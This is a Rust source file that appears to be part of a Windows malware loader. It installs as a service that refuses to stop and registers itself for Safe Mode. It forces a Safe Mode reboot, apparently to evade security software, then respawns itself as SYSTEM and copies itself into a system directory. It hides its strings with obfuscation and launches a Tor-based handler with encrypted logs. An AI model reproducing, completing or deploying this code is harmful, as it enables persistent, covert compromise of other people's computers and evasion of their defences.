use crate::safemode::utils::{
    is_safe_mode,
    register_seclogon_for_safemode,
    register_self_for_safemode,
    safemode_fail_safe,
    set_next_boot_safemode,
};
use crate::network::tor::LoaderTorHandler;
use crate::service::utils::SERVICE_TYPE;
use crate::{ err, info, tag, warn };
use anyhow::{ Context, Result };
use loader_vars::constants::{ loader_service_name, system_log_directory, system_service_directory };
use obfstr::obfstr as s;
use shared::constants::{
    get_initial_install_dir,
    get_loader_install_lock_dir,
    logs_encryption_key,
    system_loader_exe_name,
};
use shared::network::tor::LoggerConfig;
use shared::utils::config::load_mib_config;
use shared::utils::functions::{
    get_current_exe,
    is_running_from_system32,
    try_spawn_program_as_system,
};
use std::fs::{ create_dir_all, remove_dir, remove_dir_all };
use std::{ ffi::OsString, thread, time::Duration };
use windows_service::{
    define_windows_service,
    service::{ ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus },
    service_control_handler::{ self, ServiceControlHandlerResult },
    service_dispatcher,
};

pub fn start_service() -> Result<()> {
    service_dispatcher
        ::start(loader_service_name(), ffi_service_main)
        .context(s!("Failed to start service dispatcher").to_string())?;

    Ok(())
}

define_windows_service!(ffi_service_main, my_service_main);

pub fn my_service_main(_arguments: Vec<OsString>) {
    if let Err(error) = service_runner() {
        err!("Service Errored out: ", error);
    }
}

fn service_runner() -> Result<()> {
    // let (shutdown_tx, _shutdown_rx) = mpsc::channel();

    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
            ServiceControl::Stop => {
                // shutdown disabled
                // warn!("Service received stop event, exiting");
                // setup some sort of cleaning if needed make sure

                // shutdown_tx
                //     .send(())
                //     .unwrap_or_else(|e| err!("Failed to send shutdown signal: ", e));
                ServiceControlHandlerResult::NoError
            }
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    let status_handle = service_control_handler
        ::register(loader_service_name(), event_handler)
        .context(s!("Failed to register service control handler").to_string())?;

    status_handle
        .set_service_status(ServiceStatus {
            service_type: SERVICE_TYPE,
            current_state: ServiceState::Running,
            controls_accepted: ServiceControlAccept::STOP,
            exit_code: ServiceExitCode::Win32(0),
            checkpoint: 0,
            wait_hint: Duration::default(),
            process_id: None,
        })
        .context(s!("Failed to set service as running").to_string())?;

    info!("Service start");

    let is_running_from_system32 = is_running_from_system32();
    let mib_config = load_mib_config(false);
    let is_safe_mode = is_safe_mode();

    if !mib_config.clean_up_done && !is_safe_mode {
        pre_cleanup();
    }

    if !mib_config.clean_up_done && is_safe_mode {
        launch_cleanup();
    }

    if mib_config.clean_up_done && !is_running_from_system32 {
        if let Err(error) = post_cleanup() {
            err!("Post cleanup error: ", error);
        }
    }

    if mib_config.clean_up_done && is_running_from_system32 {
        system_service_work();
    }

    info!("Service end");

    status_handle
        .set_service_status(ServiceStatus {
            service_type: SERVICE_TYPE,
            current_state: ServiceState::Stopped,
            controls_accepted: ServiceControlAccept::empty(),
            exit_code: ServiceExitCode::Win32(0),
            checkpoint: 0,
            wait_hint: Duration::default(),
            process_id: None,
        })
        .context(s!("Failed to set service as stopped").to_string())?;

    Ok(())
}

fn pre_cleanup() {
    //! HERE SPARSE
    tag!("PRE-CLEANUP");
    let _ = register_self_for_safemode();
    let _ = register_seclogon_for_safemode();
    let _ = set_next_boot_safemode();
}
fn launch_cleanup() {
    tag!("LAUNCH-CLEANUP");
    if let Err(error) = try_spawn_program_as_system(get_current_exe().to_str().unwrap(), None) {
        err!("spawn_program_as_system Error: ", error);
        safemode_fail_safe();
    } else {
        let fail_safe_thread = thread::spawn(move || {
            let fail_safe_seconds = 8;
            thread::sleep(Duration::from_secs(fail_safe_seconds));
            warn!("FAIL SAFE TIMEOUT");
            safemode_fail_safe();
        });
        let _ = fail_safe_thread.join();
    }
}

fn post_cleanup() -> Result<()> {
    tag!("POST-CLEANUP");

    let system_exe = system_service_directory().join(system_loader_exe_name());
    std::fs::copy(get_current_exe(), &system_exe)?;

    // then we just run it, and exit - if it fails we auto restart next boot
    try_spawn_program_as_system(system_exe.to_str().unwrap(), None)?;

    Ok(())
}

fn system_service_work() {
    let initial_install_dir = get_initial_install_dir();
    if initial_install_dir.exists() && initial_install_dir.is_dir() {
        if let Err(error) = remove_dir_all(initial_install_dir) {
            err!("remove_dir_all on initial_install_dir Error: ", error);
        }
    }
    let loader_install_lock_dir = get_loader_install_lock_dir();
    if !loader_install_lock_dir.exists() || !loader_install_lock_dir.is_dir() {
        if let Err(error) = create_dir_all(loader_install_lock_dir) {
            err!("create_dir_all on loader_install_lock_dir Error: ", error);
        }
    }

    tokio::runtime::Builder
        ::new_multi_thread()
        .enable_all()
        .build()
        .unwrap()
        .block_on(async move {
            let logger_config = LoggerConfig::New {
                log_directory: system_log_directory(),
                log_encryption_key: logs_encryption_key(),
            };
            if let Ok(mut handler) = LoaderTorHandler::new(logger_config).await {
                handler.run_handler().await;
            }
        });
}
